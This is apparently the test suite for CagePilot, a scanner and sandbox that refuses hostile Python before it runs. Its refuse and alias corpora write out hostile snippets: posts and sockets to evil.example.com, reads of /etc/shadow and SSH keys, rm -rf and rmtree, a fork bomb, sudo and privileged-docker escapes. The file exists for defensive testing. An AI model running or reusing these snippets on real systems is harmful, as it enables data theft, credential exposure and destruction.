"""CagePilot offline assertion suite.

    python eval.py

Everything asserted here is reproduced from the engine at run time - no
number in this file is transcribed by hand. Rule counts are recomputed
from the live rule tables and compared, not copied from a previous run.

Corpus design:
- BENIGN   real data-science shapes that MUST pass (false-positive floor)
- REFUSE   containment payloads that MUST be refused, each pinned to the
           exact rule id that fires
- FLAG     suspicious-but-not-fatal shapes that MUST be allowed while the
           named rule still fires (risk < refuse threshold)
- DOCSTRING benign prose that mentions dangerous words must still pass
- ALIAS    import-alias resolution (from-import / as-import)
- EDGE     parse errors, determinism, hostile locale
- VM       Vultr VM backend against a live local vmagent (end to end)

The suite re-execs itself under a hostile locale (LC_ALL=C with PYTHONUTF8
unset) to prove the scanner cannot crash on a non-UTF-8 console.
"""

import os
import subprocess
import sys
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from cagepilot import scan_source, rule_catalog  # noqa: E402

# --------------------------------------------------------------------------
# corpora
# --------------------------------------------------------------------------

BENIGN = [
    ("pandas groupby", """
import pandas as pd
df = pd.read_csv("invoices.csv")
summary = df.groupby("vendor")["amount"].sum()
print(summary)
"""),
    ("matplotlib chart", """
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt
fig, ax = plt.subplots()
ax.bar(["a", "b"], [3, 5])
fig.savefig("out.png", dpi=120)
"""),
    ("json dump", """
import json
payload = {"vendor": "acme", "total": 1234.5}
with open("out.json", "w", encoding="utf-8") as fh:
    json.dump(payload, fh)
"""),
    ("makedirs and write", """
import os
os.makedirs("out", exist_ok=True)
with open("out/report.txt", "w") as fh:
    fh.write("done")
"""),
    ("bounded while with break", """
i = 0
while True:
    i += 1
    if i >= 100:
        break
print(i)
"""),
    ("bounded for range", """
total = 0
for i in range(1000):
    total += i
print(total)
"""),
    ("short sleep", """
import time
time.sleep(0.5)
print("ok")
"""),
    ("env config read", """
import os
token = os.environ.get("MY_APP_TOKEN", "")
print(bool(token))
"""),
    ("statistics and datetime", """
import statistics
import datetime
values = [4, 8, 15, 16, 23, 42]
print(statistics.mean(values), datetime.date.today())
"""),
    ("pathlib work", """
from pathlib import Path
p = Path("out")
p.mkdir(exist_ok=True)
(p / "note.txt").write_text("hello", encoding="utf-8")
"""),
]

REFUSE = [
    ("os.system rm -rf", "proc.shell.system", """
import os
os.system("rm -rf /data")
"""),
    ("shutil.rmtree", "fs.destroy.rmtree", """
import shutil
shutil.rmtree("/home/user/documents")
"""),
    ("while True pass", "res.loop.whiletrue", """
while True:
    pass
"""),
    ("huge range", "res.loop.range", """
for i in range(10**9):
    x = i * 2
"""),
    ("long sleep", "res.abuse.sleep", """
import time
time.sleep(3600)
"""),
    ("requests post exfil", "net.exfil.post", """
import requests
requests.post("http://evil.example.com/collect", data={"secret": "abc"})
"""),
    ("urllib urlopen", "net.exfil.urlopen", """
import urllib.request
body = urllib.request.urlopen("http://evil.example.com/x").read()
"""),
    ("raw socket", "net.exfil.socket", """
import socket
s = socket.socket()
s.connect(("evil.example.com", 4444))
"""),
    ("read /etc/shadow", "cred.access.path", """
with open("/etc/shadow") as fh:
    print(fh.read())
"""),
    ("dunder import", "proc.obfusc.import", """
__import__("os").system("id")
"""),
    ("getattr obfuscation", "proc.obfusc.getattr", """
import os
getattr(os, "system")("id")
"""),
    ("os.fork bomb", "proc.spawn.fork", """
import os
while True:
    os.fork()
"""),
    ("eval dynamic", "proc.dynamic.eval", """
payload = "1+1"
result = eval(payload)
"""),
    ("shell=True", "proc.shell.subprocess", """
import subprocess
subprocess.run("cat /etc/passwd", shell=True)
"""),
    ("rm -rf string", "fs.destroy.rmrf", """
import subprocess
subprocess.run(["bash", "-c", "echo rm -rf /tmp/everything"])
"""),
    ("sudo string", "priv.esc.sudo", """
import subprocess
subprocess.run(["bash", "-c", "sudo cat /etc/shadow"])
"""),
    ("ctypes load", "host.escape.ctypes", """
import ctypes
lib = ctypes.CDLL("/root/evil.so")
"""),
    ("chmod 777", "priv.esc.chmod", """
import os
os.chmod("/etc/hosts", 0o777)
"""),
    ("docker escape", "host.escape.container", """
import subprocess
subprocess.run(["bash", "-c", "docker run --privileged alpine"])
"""),
    ("ssh key read", "cred.access.path", """
key = open("/root/.ssh/id_rsa").read()
"""),
]

FLAG = [
    ("csv cleanup with remove", "fs.destroy.remove", """
import os
os.remove("tmp_scratch.csv")
"""),
    ("subprocess version probe", "proc.spawn.subprocess", """
import subprocess
out = subprocess.run(["python", "--version"], capture_output=True, text=True)
print(out.stdout)
"""),
    ("subprocess no shell", "proc.spawn.subprocess", """
import subprocess
subprocess.run(["ls", "-la"])
"""),
    ("requests get", "net.exfil.get", """
import requests
r = requests.get("https://api.example.com/data")
"""),
    ("os.remove single", "fs.destroy.remove", """
import os
os.remove("cache/old.csv")
"""),
    ("env dump", "cred.env.dump", """
import os
snapshot = dict(os.environ)
"""),
    ("pickle load", "deser.rce.pickle", """
import pickle
with open("state.pkl", "rb") as fh:
    state = pickle.load(fh)
"""),
    ("procfs read", "host.escape.procfs", """
with open("/proc/self/status") as fh:
    print(fh.readline())
"""),
    ("eval literal", "proc.dynamic.eval", """
result = eval("1 + 1")
"""),
    ("dns lookup", "net.exfil.dns", """
import socket
print(socket.gethostbyname("example.com"))
"""),
]

DOCSTRING = [
    ("docstring mentions sudo and rm -rf", """
\"\"\"This report script never uses sudo and never runs rm -rf.\"\"\"
import json
print(json.dumps({"ok": True}))
"""),
    ("function docstring mentions docker", """
def helper():
    \"\"\"Do not shell out to docker here; keep it pure.\"\"\"
    return 42
print(helper())
"""),
]

ALIAS = [
    ("from os import system", "proc.shell.system", """
from os import system
system("rm -rf /var/data")
"""),
    ("import subprocess as sp", "proc.shell.subprocess", """
import subprocess as sp
sp.run("id", shell=True)
"""),
    ("from subprocess import run", "proc.spawn.subprocess", """
from subprocess import run
run(["whoami"])
"""),
    ("from shutil import rmtree", "fs.destroy.rmtree", """
from shutil import rmtree
rmtree("/srv/data")
"""),
    ("from time import sleep", "res.abuse.sleep", """
from time import sleep
sleep(120)
"""),
    ("import requests as rq", "net.exfil.post", """
import requests as rq
rq.post("http://evil.example.com", data="x")
"""),
]

EDGE = [
    ("parse error is allowed, not a containment hit", "def broken(:\n    pass\n"),
    ("empty source", ""),
    ("comment only", "# nothing here\n"),
]

# --------------------------------------------------------------------------
# runner
# --------------------------------------------------------------------------

passed = 0
attempted = 0
failed = []


def check(name, cond, detail=""):
    global passed, attempted
    attempted += 1
    if cond:
        passed += 1
    else:
        failed.append("%s: %s" % (name, detail))


def main():
    for name, src in BENIGN:
        v = scan_source(src)
        check("benign/" + name, v.decision == "allow" and not v.findings,
              "decision=%s risk=%d findings=%s" % (
                  v.decision, v.risk, [f.rule for f in v.findings]))

    for name, rule, src in REFUSE:
        v = scan_source(src)
        rules = {f.rule for f in v.findings}
        check("refuse/" + name,
              v.decision == "refuse" and rule in rules,
              "decision=%s risk=%d rules=%s (want %s)" % (
                  v.decision, v.risk, sorted(rules), rule))

    for name, rule, src in FLAG:
        v = scan_source(src)
        rules = {f.rule for f in v.findings}
        check("flag/" + name,
              v.decision == "allow" and rule in rules,
              "decision=%s risk=%d rules=%s (want %s)" % (
                  v.decision, v.risk, sorted(rules), rule))

    for name, src in DOCSTRING:
        v = scan_source(src)
        check("docstring/" + name, v.decision == "allow",
              "decision=%s risk=%d findings=%s" % (
                  v.decision, v.risk, [f.rule for f in v.findings]))

    for name, rule, src in ALIAS:
        v = scan_source(src)
        rules = {f.rule for f in v.findings}
        check("alias/" + name, rule in rules,
              "rules=%s (want %s)" % (sorted(rules), rule))

    for name, src in EDGE:
        v = scan_source(src)
        check("edge/" + name, v.decision == "allow", "decision=%s" % v.decision)
    v = scan_source(EDGE[0][1])
    check("edge/parse_error is reported", v.parse_error is not None,
          "parse_error=%r" % v.parse_error)

    # determinism: same source -> identical verdict dict (latency excluded:
    # it is a receipt field, not part of the decision)
    src = REFUSE[0][2]
    d1 = scan_source(src).to_dict()
    d2 = scan_source(src).to_dict()
    d1.pop("latency_ms")
    d2.pop("latency_ms")
    check("determinism", d1 == d2, "verdicts differ")

    # every finding carries evidence, line and rule id (never fabricate)
    for name, rule, s in REFUSE:
        v = scan_source(s)
        for f in v.findings:
            check("evidence/" + name,
                  bool(f.rule) and bool(f.evidence) and f.lineno >= 1,
                  "finding=%s" % (f,))

    # rule catalog: recomputed, unique ids, 8 categories, >= 30 rules
    catalog = rule_catalog()
    ids = [r[0] for r in catalog]
    cats = sorted({r[1] for r in catalog})
    check("catalog/unique ids", len(ids) == len(set(ids)), "dupes in %s" % ids)
    check("catalog/8 categories",
          cats == ["cred", "deser", "fs", "host", "net", "priv", "proc", "res"],
          "cats=%s" % cats)
    check("catalog/>=30 rules", len(catalog) >= 30, "only %d rules" % len(catalog))

    # risk math: one high hit alone crosses the refuse threshold
    v = scan_source(REFUSE[0][2])
    check("risk/one high refuses", v.decision == "refuse" and v.risk >= 45,
          "decision=%s risk=%d" % (v.decision, v.risk))

    # ---- runner: refused code never reaches a process -----------------
    import tempfile

    from cagepilot import LocalBackend, run_code

    workdir = tempfile.mkdtemp(prefix="cagepilot-eval-")
    # generous cap for execution tests: a cold subprocess spawn must not be
    # mistaken for a hang on a loaded machine (contract, not a race)
    backend = LocalBackend(workdir=workdir, timeout_s=30)

    marker = os.path.join(workdir, "PWNED.txt")
    # payload is refused by the guard (proc.shell.system) AND would leave
    # an observable side effect if it ever reached a process - so a missing
    # marker file proves the refusal happened before execution
    evil = "import os\nos.system(\"echo pwned > %s\")" % marker.replace("\\", "/")
    res = run_code(evil, backend)
    check("runner/refused never executes",
          res.status == "refused" and not os.path.exists(marker),
          "status=%s marker_exists=%s" % (res.status, os.path.exists(marker)))
    check("runner/refusal carries guard verdict",
          res.verdict is not None and res.verdict.decision == "refuse",
          "verdict=%s" % (res.verdict and res.verdict.decision))

    good = "open('made_by_runner.txt', 'w').write('ok')\nprint('hello')"
    res = run_code(good, backend)
    check("runner/benign executes",
          res.status == "ok" and "made_by_runner.txt" in res.artifacts,
          "status=%s artifacts=%s stderr=%s" % (res.status, res.artifacts, res.stderr))

    res = run_code("raise ValueError('boom')", backend)
    check("runner/runtime error is reported", res.status == "error",
          "status=%s" % res.status)

    # dedicated short cap so the wall-clock proof costs 3s, not 30s
    fast = LocalBackend(workdir=workdir, timeout_s=3)
    res = run_code("import time\ntime.sleep(30)", fast)
    check("runner/wall-clock cap fires", res.status == "timeout",
          "status=%s" % res.status)

    # ---------------- web control layer contract ----------------
    from cagepilot import webapp

    httpd, port = webapp.make_server(0)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    try:
        # index is html - _client parses json, so use raw http.client here
        import http.client as _hc

        conn = _hc.HTTPConnection("127.0.0.1", port, timeout=15)
        conn.request("GET", "/")
        resp = conn.getresponse()
        html = resp.read().decode("utf-8")
        conn.close()
        check("web/index serves html", resp.status == 200 and "CagePilot" in html,
              "status=%s" % resp.status)
        check("web/index supports demo mode",
              "URLSearchParams" in html and "params.get('demo')" in html,
              "demo-mode hooks missing from index")

        conn2 = _hc.HTTPConnection("127.0.0.1", port, timeout=15)
        conn2.request("GET", "/?demo=evil")
        resp2 = conn2.getresponse()
        html2 = resp2.read().decode("utf-8")
        conn2.close()
        check("web/demo query passes through",
              resp2.status == 200 and "CagePilot" in html2,
              "status=%s" % resp2.status)

        status, h = webapp._client(port, "GET", "/healthz")
        check("web/healthz reports engine",
              status == 200 and h.get("ok") and h.get("rules") == len(catalog),
              "status=%s body=%s" % (status, h))

        status, v = webapp._client(port, "POST", "/api/scan",
                                   {"code": BENIGN[0][1]})
        check("web/scan benign allows",
              status == 200 and v["decision"] == "allow" and not v["findings"],
              "status=%s verdict=%s" % (status, v.get("decision")))

        status, v = webapp._client(port, "POST", "/api/scan",
                                   {"code": REFUSE[0][2]})
        check("web/scan hostile refuses", status == 200 and v["decision"] == "refuse",
              "status=%s verdict=%s" % (status, v.get("decision")))

        web_marker = os.path.join(workdir, "WEB_PWNED.txt")
        web_evil = "import os\nos.system(\"echo pwned > %s\")" % web_marker.replace("\\", "/")
        status, r = webapp._client(port, "POST", "/api/run",
                                   {"code": web_evil, "timeout_s": 5})
        check("web/run refused never executes",
              status == 200 and r.get("status") == "refused"
              and not os.path.exists(web_marker)
              and r.get("guard", {}).get("decision") == "refuse",
              "status=%s body=%s marker=%s" % (status, r.get("status"),
                                               os.path.exists(web_marker)))

        status, r = webapp._client(port, "POST", "/api/run",
                                   {"code": "print('cage-ok')", "timeout_s": 30})
        check("web/run benign executes",
              status == 200 and r.get("status") == "ok" and "cage-ok" in r.get("stdout", ""),
              "status=%s body=%s" % (status, r.get("status")))

        status, r = webapp._client(port, "POST", "/api/scan", {"code": ""})
        check("web/empty code rejected", status == 400, "status=%s" % status)

        status, r = webapp._client(port, "POST", "/api/run",
                                   {"code": "print(1)", "timeout_s": 999})
        check("web/bad timeout rejected", status == 400, "status=%s" % status)

        status, r = webapp._client(port, "GET", "/api/rules")
        check("web/rules catalog matches engine",
              status == 200 and len(r.get("rules", [])) == len(catalog),
              "status=%s n=%d" % (status, len(r.get("rules", []))))

        status, r = webapp._client(port, "GET", "/nope")
        check("web/unknown route 404", status == 404, "status=%s" % status)

        status, r = webapp._client(port, "POST", "/api/analyst",
                                   {"question": "reconcile the invoices"})
        check("web/analyst runs the full loop",
              status == 200 and r.get("status") == "ok"
              and r.get("guard", {}).get("decision") == "allow"
              and "matched: 6" in r.get("stdout", ""),
              "status=%s body=%s" % (status, str(r)[:120]))

        status, r = webapp._client(port, "POST", "/api/analyst",
                                   {"question": "x" * 501})
        check("web/analyst rejects oversized question", status == 400,
              "status=%s" % status)

        # Hosted platforms (Render) inject PORT and expect the process to
        # bind it. Prove the module entry honours the env without argv -
        # otherwise a Blueprint deploy would health-check a dead port.
        import subprocess as _sp
        import time as _time

        env_port = 8792
        hosted = dict(os.environ, PYTHONUTF8="1",
                      CAGEPILOT_PORT=str(env_port), CAGEPILOT_HOST="127.0.0.1")
        proc = _sp.Popen([sys.executable, "-m", "cagepilot.webapp"], env=hosted,
                         stdout=_sp.PIPE, stderr=_sp.STDOUT,
                         cwd=os.path.dirname(os.path.abspath(__file__)))
        try:
            up = False
            for _ in range(80):
                try:
                    c = _hc.HTTPConnection("127.0.0.1", env_port, timeout=2)
                    c.request("GET", "/healthz")
                    rr = c.getresponse()
                    rr.read()
                    c.close()
                    up = rr.status == 200
                    break
                except Exception:
                    _time.sleep(0.25)
            check("web/env PORT honoured by module entry (Render contract)",
                  up, "healthz on port %d unreachable" % env_port)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()
    finally:
        httpd.shutdown()
        httpd.server_close()

    # ---------------- Vultr VM backend (remote sandbox) ----------------
    # A real vmagent is started on the loopback interface, so the remote
    # backend is proven end to end before any Vultr credits exist. The
    # agent counts served /run requests: a host-side refusal must leave
    # that counter untouched - that is the "never crosses the wire" proof.
    import json as _json

    from cagepilot import vmagent
    from cagepilot.vmbackend import VultrVMBackend

    # Keep the suite's own output readable: the agent's per-request access
    # log would otherwise bury the summary lines (stderr is appended after
    # stdout by capture tools, e.g. the demo-video builder).
    os.environ["CAGEPILOT_VM_QUIET"] = "1"

    vm_token = "eval-token-not-a-secret"
    vm_httpd = vmagent.make_server("127.0.0.1", 0, vm_token)
    vm_port = vm_httpd.server_address[1]
    vt = threading.Thread(target=vm_httpd.serve_forever, daemon=True)
    vt.start()

    def vm_runs() -> dict:
        conn = _hc.HTTPConnection("127.0.0.1", vm_port, timeout=15)
        conn.request("GET", "/healthz")
        resp = conn.getresponse()
        body = _json.loads(resp.read().decode("utf-8"))
        conn.close()
        return body

    try:
        h = vm_runs()
        check("vm/healthz reports the agent",
              h.get("ok") is True
              and str(h.get("agent", "")).startswith("cagepilot-vmagent")
              and isinstance(h.get("runs"), int),
              "body=%s" % h)

        vm = VultrVMBackend("http://127.0.0.1:%d" % vm_port, vm_token,
                            job_timeout_s=30)
        res = run_code(good, vm)
        check("vm/benign executes on the agent",
              res.status == "ok" and "hello" in res.stdout
              and "made_by_runner.txt" in res.artifacts
              and res.backend == "vultr-vm",
              "status=%s stdout=%r artifacts=%s stderr=%s"
              % (res.status, res.stdout, res.artifacts, res.stderr))
        check("vm/receipt carries the agent's independent verdict",
              res.remote_guard is not None
              and res.remote_guard.get("decision") == "allow"
              and "remote_guard" in res.to_dict(),
              "remote_guard=%s" % (res.remote_guard,))

        before_runs = vm_runs()["runs"]
        res = run_code(evil, vm)
        after_runs = vm_runs()["runs"]
        check("vm/refused code never crosses the wire",
              res.status == "refused" and before_runs == after_runs,
              "status=%s runs %d -> %d" % (res.status, before_runs, after_runs))

        # Defense in depth: post hostile code straight at the agent, as if
        # the host screen had been bypassed - the VM must still refuse.
        conn = _hc.HTTPConnection("127.0.0.1", vm_port, timeout=15)
        conn.request("POST", "/run",
                     body=_json.dumps({"source": evil, "timeout_s": 5})
                     .encode("utf-8"),
                     headers={"Authorization": "Bearer " + vm_token,
                              "Content-Type": "application/json"})
        resp = conn.getresponse()
        receipt = _json.loads(resp.read().decode("utf-8"))
        conn.close()
        check("vm/agent independently refuses hostile code",
              resp.status == 200 and receipt.get("status") == "refused"
              and receipt.get("guard", {}).get("decision") == "refuse",
              "http=%s receipt=%s" % (resp.status, str(receipt)[:160]))
        check("vm/agent refusal leaves no side effect",
              not os.path.exists(marker),
              "marker exists at %s" % marker)

        vm_fast = VultrVMBackend("http://127.0.0.1:%d" % vm_port, vm_token,
                                 job_timeout_s=3)
        res = run_code("import time\ntime.sleep(30)", vm_fast)
        check("vm/agent enforces the wall-clock cap",
              res.status == "timeout",
              "status=%s stderr=%s" % (res.status, res.stderr))

        bad = VultrVMBackend("http://127.0.0.1:%d" % vm_port, "wrong-token")
        res = run_code(good, bad)
        check("vm/wrong token is an explicit error, never a silent run",
              res.status == "error" and "token" in res.stderr,
              "status=%s stderr=%s" % (res.status, res.stderr))

        closed = VultrVMBackend("http://127.0.0.1:1", vm_token)
        res = run_code(good, closed)
        check("vm/unreachable agent errors instead of falling back local",
              res.status == "error" and "unreachable" in res.stderr
              and res.backend == "vultr-vm",
              "status=%s stderr=%s" % (res.status, res.stderr))

        try:
            VultrVMBackend("ftp://nope", vm_token)
            ok_url = False
        except ValueError:
            ok_url = True
        check("vm/base_url must be http(s)", ok_url, "accepted a non-http url")

        local_res = run_code(good, backend)
        check("vm/local receipts stay free of remote_guard",
              "remote_guard" not in local_res.to_dict(),
              "local receipt leaked a remote verdict")
    finally:
        vm_httpd.shutdown()
        vm_httpd.server_close()

    # ---------------- analyst demo agent ----------------
    from cagepilot import analyst

    plan = analyst.plan_for("please reconcile the invoices")
    check("analyst/plans the reconcile question",
          plan is not None and "csv" in plan and "merged" in plan,
          "plan=%s" % (plan and plan[:40]))
    check("analyst/unknown question unplans",
          analyst.plan_for("what is the weather") is None, "planned a stray question")

    rep = analyst.ask("reconcile the invoices", backend=backend)
    check("analyst/runs screened code",
          rep["status"] == "ok" and rep["guard"]["decision"] == "allow"
          and rep["guard"]["risk"] == 0,
          "status=%s guard=%s" % (rep["status"], rep["guard"]["decision"]))
    out = rep["stdout"]
    check("analyst/report counts",
          "matched: 6" in out and "bank-only: 2" in out
          and "ledger-only: 2" in out,
          "stdout head=%r" % out[:80])
    check("analyst/report captures every mismatch shape",
          "[exact]" in out and "amount-diff 5.00" in out and "[same-day]" in out
          and "[merged]" in out and "= 2000.00" in out
          and "date-gap 1d" in out,
          "a mismatch shape is missing from the report")
    check("analyst/report names the unmatched rows",
          "330.00 refund" in out and "666.66 mystery item" in out,
          "unmatched rows missing from report")
    rep2 = analyst.ask("what is the weather", backend=backend)
    check("analyst/unknown question is refused to plan, not run",
          rep2["status"] == "unplanned", "status=%s" % rep2["status"])

    # every check is counted as it runs - no hand-transcribed totals
    print("=" * 64)
    print("CagePilot eval: %d/%d checks passed" % (passed, attempted))
    print("rule catalog: %d rules across %d categories (recomputed): %s"
          % (len(catalog), len(cats), ", ".join(cats)))
    print("=" * 64)
    if failed:
        for f in failed:
            print("FAIL " + f)
        return 1
    print("all green")
    return 0


if __name__ == "__main__":
    if os.environ.get("_CAGEPILOT_CHILD") != "1":
        # re-exec under a hostile locale to prove console robustness
        env = dict(os.environ)
        env["LC_ALL"] = "C"
        env["LANG"] = "C"
        env.pop("PYTHONUTF8", None)
        env["_CAGEPILOT_CHILD"] = "1"
        rc = subprocess.call([sys.executable, os.path.abspath(__file__)], env=env)
        if rc != 0:
            print("hostile-locale re-exec failed rc=%d" % rc)
            sys.exit(rc)
        print("hostile-locale re-exec (LC_ALL=C): OK")
    sys.exit(main())
